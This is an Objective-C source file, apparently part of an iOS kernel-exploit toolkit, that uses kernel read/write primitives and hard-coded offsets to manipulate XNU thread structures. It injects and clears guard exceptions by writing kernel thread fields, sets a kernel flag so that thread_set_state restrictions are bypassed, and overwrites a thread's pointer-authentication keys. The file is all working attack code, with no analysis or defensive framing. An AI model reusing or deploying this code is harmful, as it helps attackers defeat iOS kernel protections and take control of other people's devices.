#import <Foundation/Foundation.h>
#import <mach/mach.h>
#import <sys/reason.h>

#import "Thread.h"
#import "../kexploit/kcompat.h"
#import "../kexploit/rc_offsets.h"
#import "../kexploit/rc_kutils.h"
#import "../kexploit/darksword.h"

// xnu-10002.81.5/osfmk/kern/ast.h
#define AST_GUARD            0x1000

// xnu-10002.81.5/osfmk/kern/thread.h
#define TH_IN_MACH_EXCEPTION 0x8000

// bsd/sys/reason.h
#ifndef OS_REASON_GUARD
#define OS_REASON_GUARD 23
#endif

// iOS >= 18.4 field version check (no UIKit)
#define SYS_VER_GE_184() \
    ([[NSProcessInfo processInfo] isOperatingSystemAtLeastVersion:(NSOperatingSystemVersion){18, 4, 0}])

bool inject_guard_exception(uint64_t thread, uint64_t code)
{
    if (!thread_get_t_tro(thread)) {
        printf("[%s:%d] invalid tro, not injecting\n", __FUNCTION__, __LINE__);
        return false;
    }

    if (SYS_VER_GE_184()) {
        kwrite32(thread + (uint64_t)rc_off_thread_mach_exc_info_os_reason,      OS_REASON_GUARD);
        kwrite32(thread + (uint64_t)rc_off_thread_mach_exc_info_exception_type,  0);
        kwrite64(thread + (uint64_t)rc_off_thread_mach_exc_info_code,            code);
    } else {
        kwrite64(thread + (uint64_t)rc_off_thread_guard_exc_info_code, code);
    }

    uint32_t ast = kread32(thread + (uint64_t)rc_off_thread_ast);
    ast |= AST_GUARD;
    kwrite32(thread + (uint64_t)rc_off_thread_ast, ast);
    return true;
}

void clear_guard_exception(uint64_t thread)
{
    if (!thread_get_t_tro(thread))
        printf("[%s:%d] invalid tro, still clearing\n", __FUNCTION__, __LINE__);

    uint32_t ast = kread32(thread + (uint64_t)rc_off_thread_ast);
    ast &= ~AST_GUARD | 0x80000000;
    kwrite32(thread + (uint64_t)rc_off_thread_ast, ast);

    if (SYS_VER_GE_184()) {
        if (kread32(thread + (uint64_t)rc_off_thread_mach_exc_info_os_reason) == OS_REASON_GUARD &&
            kread32(thread + (uint64_t)rc_off_thread_mach_exc_info_exception_type) == 0) {
            kwrite32(thread + (uint64_t)rc_off_thread_mach_exc_info_os_reason, 0);
            kwrite32(thread + (uint64_t)rc_off_thread_mach_exc_info_exception_type, 0);
            kwrite64(thread + (uint64_t)rc_off_thread_mach_exc_info_code, 0);
        }
    } else {
        kwrite64(thread + (uint64_t)rc_off_thread_guard_exc_info_code, 0);
    }
}

bool thread_get_state_wrapper(mach_port_t machThread, arm_thread_state64_internal *outState)
{
    mach_msg_type_number_t count = ARM_THREAD_STATE64_COUNT;
    kern_return_t kr = thread_get_state(machThread, ARM_THREAD_STATE64,
                                        (thread_state_t)outState, &count);
    if (kr != KERN_SUCCESS) {
        printf("[%s:%d] thread_get_state failed: 0x%x (%s)\n",
               __FUNCTION__, __LINE__, kr, mach_error_string(kr));
        return false;
    }
    return true;
}

bool thread_set_state_wrapper(mach_port_t machThread, uint64_t threadAddr,
                              arm_thread_state64_internal *state)
{
    uint16_t options = 0;
    if (threadAddr) {
        options = thread_get_options(threadAddr);
        options |= TH_IN_MACH_EXCEPTION;
        thread_set_options(threadAddr, options);
    }

    kern_return_t kr = thread_set_state(machThread, ARM_THREAD_STATE64,
                                        (thread_state_t)state, ARM_THREAD_STATE64_COUNT);
    if (kr != KERN_SUCCESS) {
        printf("[%s:%d] thread_set_state failed: 0x%x (%s)\n",
               __FUNCTION__, __LINE__, kr, mach_error_string(kr));
        if (threadAddr) {
            options &= ~TH_IN_MACH_EXCEPTION;
            thread_set_options(threadAddr, options);
        }
        return false;
    }

    if (threadAddr) {
        options &= ~TH_IN_MACH_EXCEPTION;
        thread_set_options(threadAddr, options);
    }
    return true;
}

bool thread_resume_wrapper(mach_port_t machThread)
{
    kern_return_t kr = thread_resume(machThread);
    if (kr != KERN_SUCCESS) {
        printf("[%s:%d] thread_resume failed: 0x%x (%s)\n",
               __FUNCTION__, __LINE__, kr, mach_error_string(kr));
        return false;
    }
    return true;
}

void thread_set_pac_keys(uint64_t threadAddr, uint64_t keyA, uint64_t keyB)
{
    kwrite64(threadAddr + (uint64_t)rc_off_thread_machine_rop_pid, keyA);
    kwrite64(threadAddr + (uint64_t)rc_off_thread_machine_jop_pid, keyB);
}
